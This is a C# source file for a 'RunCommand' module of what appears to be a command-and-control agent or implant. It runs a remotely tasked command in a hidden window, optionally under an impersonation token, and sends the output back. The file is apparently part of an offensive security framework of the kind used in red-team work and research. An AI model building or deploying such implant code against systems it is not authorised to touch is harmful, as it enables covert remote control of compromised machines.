using Agent.Helpers;
using Agent.Models;
using System;
using System.Threading.Tasks;
using System.Threading;
using WinAPI;
using WinAPI.Wrapper;
using Shared;

namespace Agent.Commands
{
    public class RunCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Run;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.Command);

            string cmd = task.GetParameter<string>(ParameterId.Command);
          
            var creationParms = new ProcessCreationParameters()
            {
                Command = cmd,
                RedirectOutput = true,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory
            };

            if (context.Agent.ImpersonationToken != IntPtr.Zero)
                creationParms.Token = context.Agent.ImpersonationToken;

            var procResult = APIWrapper.CreateProcess(creationParms);

            if (procResult.ProcessId == 0)
            {
                context.Error("Process start failed!");
                return;
            }

            if (creationParms.RedirectOutput)
                APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => context.AppendResult(output, false));
        }
    }
}
